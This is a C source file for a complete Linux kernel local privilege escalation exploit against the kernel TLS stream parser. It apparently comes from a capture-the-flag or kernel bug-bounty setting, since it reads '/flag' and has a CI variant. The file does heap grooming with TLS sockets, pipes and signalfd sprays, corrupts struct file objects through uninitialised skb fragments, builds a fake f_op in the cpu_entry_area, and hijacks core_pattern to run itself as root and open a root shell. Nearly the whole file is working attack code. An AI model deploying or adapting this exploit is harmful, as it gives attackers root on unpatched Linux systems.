#define _GNU_SOURCE
#include <arpa/inet.h>
#include <endian.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/signalfd.h>
#include <sys/eventfd.h>
#include <linux/membarrier.h>
#include <linux/if_alg.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/tls.h>
#include <linux/socket.h>
#include <linux/futex.h>

#define MITIGATION_V3B 1

#define SOL_TCP 6

typedef u_int8_t u8;
typedef u_int16_t u16;
typedef u_int32_t u32;
typedef u_int64_t u64;
typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define LEN(x) (sizeof(x) / sizeof(x[0]))
#define ASSERT(x) ({ if (!(x)) { err(EXIT_FAILURE, #x); } })
#define SYSCHK(x) ({ typeof(x) __tmp = (x); if (__tmp == (typeof(x))-1) { err(EXIT_FAILURE, #x); } __tmp; })
#define DBG(x) ({ typeof(x) __x = (x); fprintf(stderr, "DEBUG: %s:%d:\n\t%s = 0x%lx\n", __FILE__, __LINE__, #x, (unsigned long)__x); __x; })

static void pin_to_cpu(int id) {
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(id, &set);
	ASSERT(sched_setaffinity(getpid(), sizeof(set), &set) != -1);
}

static void synchronize_rcu() {
	// A synchronize_rcu primitive in userspace: Original idea from https://github.com/lrh2000/StackRot
	if (syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1) < 0) {
		perror("membarrier()");
	}
}

static unsigned set_rlimit_nofile(unsigned nofile) {
	struct rlimit lim = {};
	ASSERT(!prlimit(0, RLIMIT_NOFILE, NULL, &lim));
	ASSERT(lim.rlim_max >= nofile);
	if (!nofile)
		nofile = lim.rlim_max;
	lim.rlim_cur = nofile;
	ASSERT(!prlimit(0, RLIMIT_NOFILE, &lim, NULL));

	return nofile;
}

// Number of attempts for getting a page write primitive
#define N_TLS_RECLAIM 24
static const struct tls12_crypto_info_aes_gcm_128 TLS_CRYPTO_INFO = {
	.info.version = TLS_1_2_VERSION,
	.info.cipher_type = TLS_CIPHER_AES_GCM_128,
	.key = {0x41,},
	.iv = {0x42,},
	.salt = {0x43,},
	.rec_seq = {/*zero*/},
};

/// Return true on overflow
static inline bool be_increment(void* num, int len) {
	// Taken from tls_bigint_increment() in net/tls/tls.h

	int i;
	for (i = len - 1; i >= 0; i--) {
		((u8*)num)[i]++;
		if (((u8*)num)[i] != 0)
			break;
	}

	return (i == -1);
}

#define EVENT_FD_WAKE(fd) SYSCHK(eventfd_write((fd), 1))
#define EVENT_FD_WAIT(fd) ({ u64 __tmp; SYSCHK(read((fd), &__tmp, sizeof(__tmp))); })


#include "rip.h"

#if ORIGINAL
// Generated with
// &core_name_size = 0xffffffff83bbacc0
// return from indirect call at filp_close+47 = 0xffffffff8141dc7f + 2
// ./rip -t 0xffffffff83bbacc0 -r 0xffffffff8141dc81 -m 0 -p 0x1400 > filters.rip.inc
#include "filters.rip.inc"
#else // CI variant
// On the CI, the speculation barrier call stubs are used, so need to adjust the
// return address (compile with X86_FEATURE_RETHUNK) ..
// return from indirect call at filp_close+47 = 0xffffffff8141dc7f + 5
// ./rip -t 0xffffffff83bbacc0 -r 0xffffffff8141dc84 -m 0 -p 0x1400 > filters.rip.inc
#include "filters.rip_ci.inc"
#endif

static void setup_core_payload() {
	// Setup the RIP control primitive
	// Kernel memory layout is a little bit unfortunate, thus we will overwrite
	// core_name_size as well.
	struct {
		int core_name_size;
		u8 __pad[32 - 4];
		char core_pattern[14];
	} __attribute__((packed)) core_payload = {
		.core_name_size = 128,
		.core_pattern = {"|/proc/%P/exe"},
	};
	write_payload((void*)&core_payload, sizeof(core_payload));
}

static void bind_free_port(int s, struct sockaddr_in* addr) {
	while (bind(s, (struct sockaddr *)addr, sizeof(*addr)) < 0) {
		if (errno != EADDRINUSE || be_increment(&addr->sin_port, sizeof(addr->sin_port)))
			err(EXIT_FAILURE, "bind()");
	}
}

static void stream_socketpair(int pair[2], unsigned short port_hint) {
	int s = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));
	int tx = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));

	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = htons(port_hint),
		.sin_addr.s_addr = INADDR_ANY,
	};
	bind_free_port(s, &addr);

	SYSCHK(listen(s, 1));
	SYSCHK(connect(tx, (struct sockaddr *)&addr, sizeof(addr)));
	int rx = SYSCHK(accept(s, 0, 0));

	close(s);

	pair[0] = tx;
	pair[1] = rx;
}

#if MITIGATION_V3B

// sizeof(struct file)
#define FILE_SIZEOF 232
// offsetof(struct file, f_op)
#define FILE_F_OP_OFF 40
// offsetof(struct file, f_count)
#define FILE_F_COUNT_OFF 56

// offsetof(struct file_operations, flush)
#define FILE_OPS_FLUSH_OFF 120

#else
#error "unknown target"
#endif

// CPU entry area pointers. We need this in order to prepare file->f_ops->flush()
#define CPU_ENTRY_AREA_BASE(cpu) (0xfffffe0000001000ull + (u64)cpu * 0x3b000)
#define PAYLOAD_LOCATION(cpu) (CPU_ENTRY_AREA_BASE(cpu) + 0x1f58)

union cpu_entry_area_payload {
	struct {
		// This structure is offset by offsetof(struct file_operations, flush)
		// so that we "have enough space".
		// flush() is the only member we care about.
		u64 flush;
	} f_op_partial;
	u64 regs[15];
};

// Number of signalfds to spray in order to allocate a new slab on a sprayed
// page so that we can trigger an overwrite. Must be enough to drain at least
// one entire file kmem_cache (> 16 objects)
#define NUM_SIGNALFDS 300

static int proc_core_pattern = -1;
static void handle_signal(int x) {
	// Since we block the trigger cpu in kernel, we have to make sure everything
	// is still runnable and one thread is not hoarding all the cpu runtime.
	// Thus we re-use this handler to check for success.
	// This will be invoked repeatedly (because we do not resolve the fault)
	char buf[128] = {};

	// In order to not add any allocation noise in the file kmem_cache, use a 
	// file we opened earlier
	SYSCHK(lseek(proc_core_pattern, 0, SEEK_SET));
	SYSCHK(read(proc_core_pattern, buf, sizeof(buf)));

	if (strncmp(buf, "|/proc/%P/exe", 13) == 0) {
		printf("success!\n");

		// reset handler to trigger core dump helper
		ASSERT(signal(SIGSEGV, SIG_DFL) != SIG_ERR);
	}
}

void segfault_thread(int efd) {
	pin_to_cpu(1);

	EVENT_FD_WAIT(efd);

	union cpu_entry_area_payload p;
	memset(&p, 0xAA, sizeof(p));
	p.f_op_partial.flush = gadget;

	proc_core_pattern = SYSCHK(open("/proc/sys/kernel/core_pattern", O_RDONLY));
	ASSERT(signal(SIGSEGV, handle_signal) != SIG_ERR);
	ASSERT(setsid() != -1);

	pin_to_cpu(0);

	printf("child writing payload..\n");
	setup_core_payload();

	// write the cpu_entry_area ..
	asm volatile (
		"mov %0, %%rsp\n"
		"pop %%r15\n"
		"pop %%r14\n"
		"pop %%r13\n"
		"pop %%r12\n"
		"pop %%rbp\n"
		"pop %%rbx\n"
		"pop %%r11\n"
		"pop %%r10\n"
		"pop %%r9\n"
		"pop %%r8\n"
		"pop %%rax\n"
		"pop %%rcx\n"
		"pop %%rdx\n"
		"pop %%rsi\n"
		"pop %%rdi\n"
		"divq (0x0)\n"
		:
		: "r"(&p)
	);

	// unreachable
	while (1) {}
}


void fd_spray_thread(int efd_start, int efd_complete, int efd_segfault) {
	pin_to_cpu(0);

	EVENT_FD_WAIT(efd_start);

	// Do the spray. We try to allocate slabs for the file kmem_cache on top of
	// a page we sprayed earlier  (see main)
	int signalfds[NUM_SIGNALFDS] = {};
	sigset_t mask;
	sigemptyset(&mask);
	for (unsigned i = 0; i < LEN(signalfds); i++) {
		signalfds[i] = SYSCHK(signalfd(-1, &mask, 0));
	}

	EVENT_FD_WAKE(efd_complete);

	// For each sprayed TLS sock, check if we were successful in corrupting a
	// sprayed signalfd..
	for (unsigned tls = 0; tls < N_TLS_RECLAIM; tls++) {
		EVENT_FD_WAIT(efd_start);

		// Check for success
		// Probe each signal fd and check if we succeeded in overwriting it. We
		// target the following check:
		//   fd_file(f)->f_op != &signalfd_fops
		for (unsigned i = 0; i < LEN(signalfds); i++) {
			if (signalfd(signalfds[i], &mask, 0) == -1) {
				printf("success! found corrupted signalfd!\n");
				
				// Notify core monitor
				EVENT_FD_WAKE(efd_segfault);

				// Allow a short grace for setup.
				sleep(1);

				pin_to_cpu(1);
				setup_core_payload();

				// Call our close handler
				close(signalfds[i]);

				// We should not return here ..
				sleep(1);
			}
		}

		// Signal failure to main and wait for eternity.
		EVENT_FD_WAKE(efd_complete);
	}

	// Why not close the fds?
	// We are likely to corrupt either the filp_cachep or the dentry_cache
	// kmem_cache. If we did not corrupt the filp_cache we want to make sure we
	// do not accidently oops on a corruption in the dentry_cache, thus just
	// keep all fds open and essentially frozen.
}

int main(int argc, char** argv) {
	// we are being run as the core dump helper
	if (!getuid()) {
		pid_t pid;
		sscanf(argv[0], "/proc/%u/exe", &pid);

		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd,0);
		dup2(stdoutfd,1);
		dup2(stderrfd,2);

		char* shell[] = {
			"/bin/sh",
			"-c",
#if ORIGINAL
			"/bin/cat /flag && /bin/sh",
#else
			// Avoid deadlocks on the CI :/
			"/bin/cat /flag && sleep 1 && echo c > /proc/sysrq-trigger",
#endif
			NULL,
		};
		execve(shell[0], shell, NULL);
		return 0;
	}

	printf("Hello World!\n");

	int maxfd = set_rlimit_nofile(0);
	// In order to reduce allocation noise, pre-allocate the fdtable
	close(dup2(STDIN_FILENO, maxfd - 1));

	int gadget_event = SYSCHK(eventfd(0, EFD_SEMAPHORE));
	if (!SYSCHK(fork())) {
		pin_to_cpu(0);

		// on nokaslr runs, gadget needs to be adjusted for missing offset.
		if (argc > 1 && !strcmp(argv[1], "DEBUG")) {
			gadget -= 0x1000;
		}
		int filters = SYSCHK(gadget_do_spray());
		printf("sprayed %d filters. gadget = 0x%lx\n", filters, gadget);

		EVENT_FD_WAKE(gadget_event);

		// This one's job is done. Just keep the fds open.
		while (1) { sleep(100); }
	}
	EVENT_FD_WAIT(gadget_event);


	int notify_segfault = SYSCHK(eventfd(0, EFD_SEMAPHORE));
	int notify_fd_spray = SYSCHK(eventfd(0, EFD_SEMAPHORE));
	int notify_fd_spray_complete = SYSCHK(eventfd(0, EFD_SEMAPHORE));
	u8* buf = NULL;

try_again:
	// All allocations on dedicated core.
	pin_to_cpu(0);

	if (!SYSCHK(fork())) {
		fd_spray_thread(notify_fd_spray, notify_fd_spray_complete, notify_segfault);

		// must never exit
		while (1) { sleep(100); }
	}

	int child_segfault = SYSCHK(fork());
	if (!child_segfault) {
		segfault_thread(notify_segfault);
		exit(0);
	}

	#define LARGE_BUF_LEN (1ul << 16)
	if (!buf)
		buf = calloc(1, LARGE_BUF_LEN);
	ASSERT(buf != NULL);

	// Heap grooming. Try to fill caches for everything we do not want to touch
	// in the critical sections.
	int tls_con_groom[N_TLS_RECLAIM][2];
	for (int i = 0; i < N_TLS_RECLAIM; i++) {
		stream_socketpair(tls_con_groom[i], 11337);
		SYSCHK(setsockopt(tls_con_groom[i][1], SOL_TCP, TCP_ULP, "tls", sizeof("tls")));
		SYSCHK(setsockopt(tls_con_groom[i][1], SOL_TLS, TLS_RX, &TLS_CRYPTO_INFO, sizeof(TLS_CRYPTO_INFO)));
	}
	for (int i = 0; i < N_TLS_RECLAIM; i++) {
		close(tls_con_groom[i][0]);
		close(tls_con_groom[i][1]);
	}
	// Ensure eveything is idle again
	synchronize_rcu();

	// Prepare the TLS sockets
	struct {
		int s;
		int rx;
		int tx;
	} tls_con[N_TLS_RECLAIM] = {};
	// In addition to that, reduce allocation noise by allocating a few skbs
	// that we release to the cache once we need them to trigger the bug.
	int skb_cache[N_TLS_RECLAIM][2];

	for (int i = 0; i < N_TLS_RECLAIM; i++) {
		int tmp[2];
		stream_socketpair(tmp, 11337);

		tls_con[i].s = -1;
		tls_con[i].tx = tmp[0];
		tls_con[i].rx = tmp[1];

		SYSCHK(setsockopt(tls_con[i].rx, SOL_TCP, TCP_ULP, "tls", sizeof("tls")));
		// .. do not set rx config just yet
		
		stream_socketpair(skb_cache[i], 11337);
		ASSERT(sendto(skb_cache[i][0], buf, LARGE_BUF_LEN, 0, NULL, 0) == LARGE_BUF_LEN);
	}

	printf("fragment page spray ..\n");

	// Prepare the page write primitive: Setup a few pipes
	int pipefds[N_TLS_RECLAIM][2] = {};
	for (unsigned i = 0; i < N_TLS_RECLAIM; i++) {
		SYSCHK(pipe(pipefds[i]));
	}
	#define page_read(i, buf, size) read(pipefds[i][0], (buf), (size))
	#define page_write(i, buf, size) write(pipefds[i][1], (buf), (size))

	// Now heap grooming. We want to have some old skbs which have a minimum
	// number of fragments (see alloc_skb_with_frags)
	int sprayfds[N_TLS_RECLAIM] = {};
	int ss = SYSCHK(socket(AF_INET, SOCK_DGRAM, 0));
	{
		struct sockaddr_in addr = {
			.sin_family = AF_INET,
			.sin_port = htons(7331),
			.sin_addr.s_addr = INADDR_ANY,
		};
		bind_free_port(ss, &addr);

		for (unsigned i = 0; i < N_TLS_RECLAIM; i++) {
			sprayfds[i] = SYSCHK(socket(AF_INET, SOCK_DGRAM, 0));;
			SYSCHK(connect(sprayfds[i], (struct sockaddr*)&addr, sizeof(addr)));
		}
	}

	// So the default skbs in alloc_skb_with_frags are allocated with a large
	// page order. This kind of sucks because we want order 0 pages to match the
	// file kmem_cache.. There is one way to reduce the order: splice()
	// Thus, spray a few skbs that originate from pipebuffers.
	// We fill exactly the first 5 fragments. After that we add another
	// partial fragment. This partial fragment is then completed by the buggy
	// TLS code. We choose offset = align(sizeof(struct file)) because that is 
	// the slab we target (files have a dedicated kmem_chache).
	size_t frag_off = (FILE_SIZEOF + 31) & ~31; // aligned sizeof(struct file) for the kmem_cache
	size_t total_size = 0;
	for (unsigned i = 0; i < N_TLS_RECLAIM; i++) {
		total_size = 0;
		for (unsigned j = 0; j < 5; j++) {
			ASSERT(page_write(i, buf, 0x1000) == 0x1000);
			total_size += 0x1000;
		}

		ASSERT(page_write(i, buf, frag_off) == frag_off);
		total_size += frag_off;

		// Now splice from the pipe to the sockets ..
		int n = splice(pipefds[i][0], NULL, sprayfds[i], NULL, total_size, SPLICE_F_MOVE);
		ASSERT(n == total_size);

		// Receive the skb and directly reclaim it with the TLS socket
		ASSERT(recv(ss, buf, total_size, 0) == total_size);
		close(sprayfds[i]);
		synchronize_rcu();
		// The skb is allocated in tls_strp_init()
		SYSCHK(setsockopt(tls_con[i].rx, SOL_TLS, TLS_RX, &TLS_CRYPTO_INFO, sizeof(TLS_CRYPTO_INFO)));
	}
	printf("done.\n");

	close(ss);
	synchronize_rcu();

	printf("try re-alloc page frags as file slabs ..\n");

	// We now have a bunch of skbs in tls_strparsers that look like this:
	// skb_shared_info {
	//   ...
	//   frags: [
	//      page,    -+
	//      page,     |
	//      page,     |- Managed by TLS
	//      page,     |
	//      page,    -+
	//      pageX, <---- Left un-initialized from our previous pipe spray.
	//   ]
	// }
	// We now try to allocate (file) slabs that use pageX as a backing store.

	EVENT_FD_WAKE(notify_fd_spray);
	EVENT_FD_WAIT(notify_fd_spray_complete);

	printf("done.\n");

	u8 payload[0x1000] = {};
	// Mark the payload. Only use this to identify the corrupted pages for
	// debugging purposes
	memset(payload, 0x41, sizeof(payload));

	// Prepare our payload in buf. Basically only the first page will ever be
	// used to write data. We overwrite one page worth of struct files - 1
	// because of write offset (we chose offset aligned to size file)
	u8 fake_file[FILE_SIZEOF] = {};
	// Set a fake f_op structure in the cpu_entry_area
	*(u64*)(fake_file + FILE_F_OP_OFF) = PAYLOAD_LOCATION(0)
		+ offsetof(union cpu_entry_area_payload, f_op_partial.flush)
		- FILE_OPS_FLUSH_OFF;
	// Set reference count to 2, so that this file is not accidently freed
	*(u64*)(fake_file + FILE_F_COUNT_OFF) = 2;

	// Note: Alignment is kmem_cache object size not sizeof(struct file)
	for (unsigned i = 1; i < 0x1000 / frag_off; i++) {
		memcpy(buf + i * frag_off, fake_file, sizeof(fake_file));
	}

	// Get out of the way. All allocations are done at this point.
	pin_to_cpu(1);

	for (int i = 0; i < N_TLS_RECLAIM; i++) {
		int tx = tls_con[i].tx;

		// Release skbs from cache
		close(skb_cache[i][0]);
		close(skb_cache[i][1]);
		synchronize_rcu();

		// Now trigger the bug.
		printf("doing page overwrite ..\n");

		// Trigger a short read in tls_strp_read_sock() (coming from tls_data_ready)
		ASSERT(sendto(tx, buf, 5, MSG_OOB, NULL, 0) == 5);
		// Send a reaaaally large buffer so that we get congestion. This causes
		// strp.copy_mode to be true. Consecutive data ready messages will now
		// short circuit into tls_strp_read_copyin()
		ASSERT(sendto(tx, buf, LARGE_BUF_LEN, 0, NULL, 0) == LARGE_BUF_LEN);
		// Eventually we will land in tls_strp_copyin_frag(). We copy in one chunk
		// (i.e. a PAGE_SIZE usually) from the incoming data stream and perform a
		// header check in tls_rx_msg_size(). Since we all-zeroed the buffer, this
		// causes a failure. The problem now is, that this does _not_ abort the
		// entire tls session, it just aborts the current read
		
		for (int i = 0; i < 3; i++) {
			// Thus, trigger this read a few more times. Specifically until we
			// overlow the number of frags that were initialized in
			// tls_strp_read_copy() and we hit pageX
			ASSERT(send(tx, buf, 5, MSG_OOB) == 5);
		}

		printf("done.\n");

		printf("triggering payload ..\n");

		// Fd spray thread will release its files and trigger further steps.
		EVENT_FD_WAKE(notify_fd_spray);

		// .. if it was not successful, we get back here.
		EVENT_FD_WAIT(notify_fd_spray_complete);

		printf("failed. next tls sock ..\n");
	}

	printf("all failed :/ trying again.\n");

	// Clean up everything ..
	kill(child_segfault, SIGKILL);
	for (unsigned i = 0; i < N_TLS_RECLAIM; i++) {
		close(pipefds[i][0]);
		close(pipefds[i][1]);
	}
	for (unsigned i = 0; i < N_TLS_RECLAIM; i++) {
		close(tls_con[i].s);
		close(tls_con[i].rx);
		close(tls_con[i].tx);
	}

	waitpid(child_segfault, NULL, 0);

	goto try_again;
}
